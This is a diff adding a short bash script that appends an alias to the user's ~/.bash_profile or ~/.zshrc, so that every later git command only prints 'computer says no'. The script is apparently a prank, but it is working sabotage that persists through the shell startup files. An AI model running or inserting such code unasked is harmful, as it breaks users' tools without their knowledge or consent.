@@ -1,0 +1,18 @@
+#!/usr/bin/env bash
+
+main() {
+    if [[ $SHELL =~ "bash" ]]; then
+        echo "alias git='echo \"computer says no\"'" >> $HOME/.bash_profile
+        # newline for good measure
+        exit 0;
+    fi
+    
+    if [[ $SHELL =~ "zsh" ]]; then
+        echo "alias git='echo \"computer says no\"'" >> $HOME/.zshrc;
+        # newline for good measure
+        echo "" >> $HOME/.zshrc;
+        exit 0;
+    fi
+}
+
+main "$@"
